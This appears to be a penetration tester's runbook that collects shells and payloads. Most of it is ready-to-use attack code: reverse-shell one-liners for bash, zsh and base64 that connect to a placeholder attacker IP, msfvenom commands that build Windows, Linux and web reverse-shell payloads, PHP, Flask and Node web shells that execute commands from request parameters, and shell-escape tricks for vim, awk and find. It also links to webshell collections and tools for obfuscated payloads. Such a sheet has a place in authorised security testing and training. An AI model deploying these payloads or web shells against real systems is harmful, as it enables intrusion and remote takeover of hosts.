# Shell & Payloads
<!--- Status 90% --->
<!---  add C2 --->

## Introduction
Update
This runbook provides a guide to for various shells and payloads. It includes a variety of techniques and tools to create a payload or upgrade your current shell to on that is more stable.

## Table of Contents

- [Shell \& Payloads](#shell--payloads)
  - [Introduction](#introduction)
  - [Table of Contents](#table-of-contents)
  - [Payload Structure - msfvenom](#payload-structure---msfvenom)
  - [Non-Meterpreter shells](#non-meterpreter-shells)
    - [Useful reverse shells](#useful-reverse-shells)
    - [Windows](#windows)
      - [Powershell](#powershell)
      - [x86 staged - msfvenom (Non-Meterpreter)](#x86-staged---msfvenom-non-meterpreter)
      - [x64 staged - msfvenom (Non-Meterpreter)](#x64-staged---msfvenom-non-meterpreter)
      - [x86 stageless - msfvenom (Non-Meterpreter)](#x86-stageless---msfvenom-non-meterpreter)
      - [x64 stageless - msfvenom (Non-Meterpreter)](#x64-stageless---msfvenom-non-meterpreter)
    - [Linux](#linux)
      - [x86 staged - msfvenom (Non-Meterpreter)](#x86-staged---msfvenom-non-meterpreter-1)
      - [x64 staged - msfvenom (Non-Meterpreter)](#x64-staged---msfvenom-non-meterpreter-1)
      - [x86 stageless - msfvenom (Non-Meterpreter)](#x86-stageless---msfvenom-non-meterpreter-1)
      - [x64 stageless - msfvenom (Non-Meterpreter)](#x64-stageless---msfvenom-non-meterpreter-1)
  - [Web Payloads](#web-payloads)
    - [Java WAR - msfvenom (Non-Meterpreter)](#java-war---msfvenom-non-meterpreter)
    - [ASP - msfvenom (Non-Meterpreter)](#asp---msfvenom-non-meterpreter)
    - [ASPX - msfvenom (Non-Meterpreter)](#aspx---msfvenom-non-meterpreter)
    - [JSP - msfvenom (Non-Meterpreter)](#jsp---msfvenom-non-meterpreter)
    - [WAR - msfvenom (Non-Meterpreter)](#war---msfvenom-non-meterpreter)
    - [PHP - msfvenom (Non-Meterpreter) - Reverse Shell](#php---msfvenom-non-meterpreter---reverse-shell)
  - [Web Shells](#web-shells)
    - [PHP](#php)
    - [JSP](#jsp)
    - [ASP](#asp)
    - [ASPX](#aspx)
    - [Webshell Infecting views.py - Python (Flask)](#webshell-infecting-viewspy---python-flask)
    - [nodejs](#nodejs)
    - [Perl](#perl)
    - [Ruby](#ruby)
    - [Lua](#lua)
    - [AWK](#awk)
    - [Find](#find)
    - [Using Exec To Launch A Shell](#using-exec-to-launch-a-shell)
    - [VIM](#vim)
      - [Vim To Shell](#vim-to-shell)
      - [Vim Escape](#vim-escape)
    - [Laudanum](#laudanum)
  - [Payload Generation](#payload-generation)
  - [Spawn tty via Python](#spawn-tty-via-python)
  - [Spawn an upgraded shell](#spawn-an-upgraded-shell)

## Payload Structure - msfvenom

A staged payload is usually shipped in two parts. The first part contains a small primary payload that will establish a connection, transferring a larger secondary payload with the rest of the shellcode.  
windows/shell_reverse_tcp (stageless)
windows/shell/reverse_tcp (staged)

## Non-Meterpreter shells

### Useful reverse shells

- Reverse shell oneliners:

```sh
bash -i >& /dev/tcp/<ip>/443 0>&1 # bash
bash -c "bash -i >& /dev/tcp/<ip>/443 0>&1" # sh or dash
zsh -c 'zmodload zsh/net/tcp && ztcp <ip> 443 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY' # zsh
```

- Reverse shell encoded oneliner:

```sh
echo "bash -c 'bash -i >& /dev/tcp/<ip>/443 0>&1'" | base64
echo '<payload>' | base64 --decode | bash
```

- TCP reverse shell executable:

```sh
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=443 -f elf > shell.elf
```

### Windows

#### Powershell

[reverse PowerShell cmdline payload generator](https://gist.github.com/tothi/ab288fb523a4b32b51a53e542d40fe58)

#### x86 staged - msfvenom (Non-Meterpreter)

```sh
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > <name>-x86.exe
```

#### x64 staged - msfvenom (Non-Meterpreter)

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > <name>-x64.exe
```

#### x86 stageless - msfvenom (Non-Meterpreter)

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > <name>-x86.exe
```

#### x64 stageless - msfvenom (Non-Meterpreter)

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > ,name>-x64.exe
```

### Linux

#### x86 staged - msfvenom (Non-Meterpreter)

```sh
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
```

#### x64 staged - msfvenom (Non-Meterpreter)

```sh
msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

#### x86 stageless - msfvenom (Non-Meterpreter)

```sh
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
```

#### x64 stageless - msfvenom (Non-Meterpreter)

```sh
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

## Web Payloads

### Java WAR - msfvenom (Non-Meterpreter)

```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
```

### ASP - msfvenom (Non-Meterpreter)

```sh
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
```

### ASPX - msfvenom (Non-Meterpreter)

```sh
msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<LPORT> -f aspx > shell.aspx
```

### JSP - msfvenom (Non-Meterpreter)

```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
```

### WAR - msfvenom (Non-Meterpreter)

```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
```

### PHP - msfvenom (Non-Meterpreter) - Reverse Shell

```sh
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```
or 
[pentest monkey php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
[php reverse shell](https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse%20Shell.php)

## Web Shells

### PHP

on kali /usr/share/webshells/php
```php
<?php echo shell_exec($_GET['cmd']);?>
<?php system($_GET['cmd']);?>
<?php echo exec($_GET['cmd']);?>
```

### JSP

 [fuzz webshell](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmdjsp.jsp)

```sh
locate cmdjsp.jsp
```

### ASP

[cmd-asp-5.1.asp](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd-asp-5.1.asp)\
[cmdasp.asp](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.asp)

```sh
locate cmd-asp-5.1.asp
locate cmdasp.asp
```

### ASPX

[cmdasp](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.aspx)

```
locate cmdasp.aspx
```

### Webshell Infecting views.py - Python (Flask)

```python
import os
from flask import Flask,request,os

app = Flask(__name__)
   
@app.route('/okay')
def cmd():
    return os.system(request.args.get('c'))

if __name__ == "__main__":
	app.run()
```
[views](https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/views.py)

### nodejs

``` node
const express = require('express')
const app = express();

app.listen(3000, () => 
	console.log('...')
);
function Exec(command){ 
	const { execSync } = require("child_process");
	const stdout = execSync(command);
	return "Result: "+stdout
}
app.get('/okay/:command', (req, res) => 
res.send(Exec(req.params.command))
);
```
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/views.js

### Perl

Find and edit

```
locate perl-reverse-shell.pl
```

Perl to shell

```sh
#/bin/bash
perl —e 'exec "/bin/sh";'
```
```perl
#/perl
perl: exec "/bin/sh";
```

### Ruby

```ruby
ruby: exec "/bin/sh"
```

### Lua

```
lua: os.execute('/bin/sh')
```

### AWK

```
awk 'BEGIN {system("/bin/sh")}'
```

### Find

```sh
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

### Using Exec To Launch A Shell

```
find . -exec /bin/sh \; -quit
```

### VIM

#### Vim To Shell

```
vim -c ':!/bin/sh'
```

#### Vim Escape

```
vim
:set shell=/bin/sh
:shell
```

### Laudanum

Located at '/usr/share/laudanum'

## Payload Generation

| Resource | Description |
| ----- | ---- |
| [MSFVenom & Metasploit-Framework](https://github.com/rapid7/metasploit-framework) |	MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife.
| [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings) |  Here, you can find many different resources and cheat sheets for payload generation and general methodology.
| [Mythic C2 Framework](https://github.com/its-a-feature/Mythic) | The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation.
| [Nishang](https://github.com/samratashok/nishang) | Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester.
| [Darkarmour](https://github.com/bats3c/darkarmour) | Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts.

## Spawn tty via Python

``` python
python -c 'import pty;pty.spawn("/bin/bash")';
```
`ctrl + z`

stty raw -echo; fg 

## Spawn an upgraded shell

```
export TERM=xterm && /usr/bin/script -qc /bin/bash /dev/null 
```
`ctrl + z`
```
stty raw -echo; fg 
```

 <!--- Last Updated Jan 12, 2025 --->